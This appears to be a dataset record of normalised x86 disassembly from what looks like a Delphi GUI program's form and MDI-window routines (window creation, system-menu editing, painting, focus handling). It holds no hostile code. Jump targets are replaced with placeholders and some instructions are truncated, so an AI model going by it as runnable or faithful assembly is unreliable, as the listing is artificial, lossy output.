mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45cc11
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_459fac
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov eax ebx
call sub_45d56c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_448484
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push esp
mov eax [ rw-data ]
push eax
push 0x0
mov eax ebx
call sub_448484
push eax
mov eax ebx
call sub_4417ac
push eax
mov eax ebx
call sub_441768
push eax
push 0x0
push 0x0
push 0x56330001
push 0x0
push r-xdata
push 0x200
call CreateWindowExA
mov [ ebx + 0x254 ] eax
push ebx
push sub_45bc24
call sub_41f228
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_452184
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_448484
push eax
call SetWindowPos
jmp r-xdata
sub_45cd5a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45ce85
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_4456a4
and [ ebx + 0x2ec ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45f200
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce8c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2ec ] 0x10
jmp r-xdata
sub_45ce94
push ebx
mov ebx eax
test [ ebx + 0x2ec ] 0x10
je r-xdata
mov eax ebx
call sub_445914
push 0x0
mov eax ebx
call sub_448484
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_45ced8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446098
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_448484
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448484
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45cf3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45cfe4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cfeb
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax edi
call sub_4592cc
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4038bc
mov eax ebx
call sub_45d2f4
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4038bc
test al al
jne r-xdata
sub_45cff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_445030
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_445030
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45cf3c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45d03c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45cf3c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
sub_45d060
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_416340
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41621c
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_416340
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41621c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_45d2d0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_448484
mov dx 0xb000
call sub_459074
test al al
jne r-xdata
call sub_448484
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_459074
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d2d7
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403f38
jmp r-xdata
call sub_403f38
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_445030
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_448484
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_459074
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_442f30
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
call sub_403f38
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_448484
mov dx 0xb01a
call sub_459074
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
call sub_403f38
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_442f30
sub_45d2f4
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_442f30
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_448484
push eax
call SetFocus
mov eax ebx
call sub_448484
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45d344
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_442f30
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45d3f8
mov eax esi
call sub_45d2f4
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4488ac
mov edx eax
mov eax esi
call sub_45cf3c
sub_45d3a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45bfc4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_442f30
mov eax ebx
call sub_45bfc4
mov edx esi
call sub_45d3a8
sub_45d3f8
push esi
test [ eax + 0x2ec ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_455b7c
mov edx esi
call sub_455b60
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45d4a0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_45d4ec
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_45d4a0
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45d51c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_45d4a0
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_45d588
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_422134
xor eax eax
push ebp
push sub_45d636
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_422568
xor eax eax
push ebp
push sub_45d613
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4038bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d61a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_422568
retn
sub_45d644
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_45bfc4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45bff8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_4038bc
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_447798
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_45c044
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_4038bc
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_45d6e4
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_448484
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45d56c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_448484
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_4466b4
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45d762
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_421d14
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45d7c4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_446978
pop edi
pop esi
retn
sub_45d810
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448484
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_45d90c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45c338
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_45d810
pop ecx
sub_45d940
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_443450
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448484
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_448484
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_442424
pop esi
pop ebx
retn
sub_45d9d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_448484
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_447724
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_448484
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45559c
sub_45da30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_446814
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_454fb0
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_45da7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_455810
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45dab4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_45db4f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db56
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_454f10
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46270c
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43eedc
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46270c
jmp r-xdata
sub_45db7c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_4038bc
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_45dbbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d39c
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_45dbe8
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45d3a8
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43ecb4
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_45dc40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_447608
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_461118
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_4038bc
sub_45dccc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_448484
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_448484
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_448484
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45dd64
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448484
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45d344
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_4038bc
sub_45ddbc
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_4489b8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_45dde8
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45d3a8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45de04
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_454f40
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_454f40
sub_45de44
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45de7c
push ebp
mov ebp esp
push ebx
mov ebx eax
